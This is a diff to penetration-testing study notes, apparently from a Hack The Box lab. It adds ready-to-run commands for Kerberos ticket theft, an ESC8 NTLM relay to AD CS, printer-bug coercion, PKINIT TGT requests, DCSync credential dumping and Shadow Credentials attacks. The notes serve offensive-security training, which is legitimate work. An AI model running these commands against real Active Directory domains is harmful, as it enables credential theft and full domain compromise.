@@ -122,15 +122,15 @@ we manage to compromise a Linux machine connected to Active Directory. In that c
 ```bash
 # Kerberos tickets : 
 
-#Keytab ccache
-  /tmp # store the Keytab ccache 
-  KRB5CCNAME  # Keytab ccache environment variable (By default) 
+#Kerberos CCache
+  /tmp/krb5cc_<UID> # (TGT) 
+  KRB5CCNAME  # Kerberos CCache environment variable 
 
 # keytab ticket
-  file.keytab # randoom location just search
+  ~/file.keytab # Any path ,Contains principal‑key pairs for non‑interactive logins  
 
 # machine ticket   
-  /etc/krb5.keytab  # machine account (access from root user only)
+  /etc/krb5.keytab  # machine credentials , root‑only access 
 
 # A keytab is a file containing pairs of Kerberos principals and encrypted keys
 
@@ -211,7 +211,8 @@ smbclient //dc01/C$ -k -c ls -no-pass
 
 [+] # our attacker machine don't have connection to the Domain controller so we need to setup the trafft to the compromised domain joined machine (ex, MS01)
 -----------------
-### setup traffic via the compromised domain joined machine
+
+### setup traffic via the compromised domain (only if ad in privet network)
 
 #### on attacker machine
 cat /etc/hosts
@@ -251,6 +252,17 @@ cat /etc/krb5.conf
     }
 <SNIP>
 #### Using Evil-WinRM with Kerberos
+cat /etc/krb5.conf
+[libdefaults]
+        default_realm = INLANEFREIGHT.HTB
+
+<SNIP>
+
+[realms]
+    INLANEFREIGHT.HTB = {
+        kdc = dc01.inlanefreight.htb
+    }
+<SNIP>
 proxychains evil-winrm -i dc01 -r inlanefreight.htb #=> whoami : julio ; hostname : DC01
 -------------------------------------------------------------------------------
 ## Convert ccache file or a kirbi file
@@ -265,4 +277,62 @@ dir \\dc01\julio
 -------------------------------------------------------------------------------
 ## Linikatz
 ./linikatz.sh # creds & tickets dump  (mimikatz version for linux)
+```
+## Pass the Certificate
+```bash
+# Pass the Certificate technique of using certificates to successfully obtain TGT 
+# PKINIT = Public Key Cryptography for Initial Authentication
+
+## AD CS NTLM Relay Attack (ESC8)
+  
+  # CA01 = machine in domain , DC01 = domain controller
+  
+# MACHINE-ACCOUNT/DC01 NTLM Auth ──► Attacker (ntlmrelayx) ──► ADCS (<C01>/certsrv/certfnsh.asp) ──► Kerberos Cert ──► Impersonation
+  impacket-ntlmrelayx -t http://<MACHINE_C01-ip>/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
+    # enum the template value:
+    certipy find -u <user> -p <pass> -dc-ip <ip>
+  # attcker the victime to auth to his \\ATTACKER\SHARE or:
+     # Force DC01$ to auth back to attacker using Printer Bug
+     python3 printerbug.py INLANEFREIGHT.LOCAL/<CA01_USER>:"PASS"@<DC01-ip> <ATTACKER-ip> #=>  ./DC01$.pfx (get get the machine account(dc01$) cert)
+
+## Pass-the-Certificate attack to obtain a TGT as DC01$
+  python3 gettgtpkinit.py -cert-pfx ./DC01$.pfx -dc-ip <DC01-IP> 'inlanefreight.local/dc01$' /tmp/dc.ccache # -> DC01 TGT
+  export KRB5CCNAME=/tmp/dc.ccache  
+  # DCSync attack: dump administrator NTLM hash 
+  impacket-secretsdump -k -no-pass -dc-ip <DC01-IP> -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
+  impacket-secretsdump -k -no-pass -dc-ip <DC01-IP> 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL # extrace all creds
+
+
+## Shadow Credentials (msDS-KeyCredentialLink)
+  # AD attack abusing msDS-KeyCredentialLink stores public keys , we abusing it by replacing it with our public key
+  [+] BloodHound: AddKeyCredentialLink # USER1 -> AddKeyCredentialLink -> USER2 (can login via PKINIT)
+  # perform Shadow Credentials attack to generates an X.509 certificate
+  pywhisker --dc-ip <DC01-IP> -d INLANEFREIGHT.LOCAL -u <USER1> -p 'PASS' --target <USER2> --action add #=> cert..pfx
+  # get the tgt from the cert
+  python3 gettgtpkinit.py -cert-pfx ./cert.pfx -pfx-pass 'cert-pass' -dc-ip <DC01-ip> INLANEFREIGHT.LOCAL/USER2 /tmp/USER2.ccache
+  export KRB5CCNAME=/tmp/USER2.ccache
+  klist #=> USER2@INLANEFREIGHT.LOCAL
+
+	# now we since we have TGT can do pas the ticket attack 
+	# connect using Kerberos
+	cat /etc/krb5.conf
+[libdefaults]
+        default_realm = INLANEFREIGHT.HTB
+
+<SNIP>
+
+[realms]
+    INLANEFREIGHT.HTB = {
+        kdc = dc01.inlanefreight.htb
+    }
+<SNIP>
+    evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local # (note: ensure that krb5.conf is properly configured)
+    
+## ## No PKINIT?
+# In some cases, attacker gets a cert but can't use PKINIT (e.g. for DC$ account)  
+# Reason: KDC doesn’t support required EKU for that account  
+# Solution: use PassTheCert tool (https://github.com/AlmondOffSec/PassTheCert/)
+# → Auth via LDAPS using the cert (not Kerberos)  
+# → Can change passwords, add DCSync rights, etc.  
+# Useful when PKINIT fails, worth learning (https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html) 
 ```
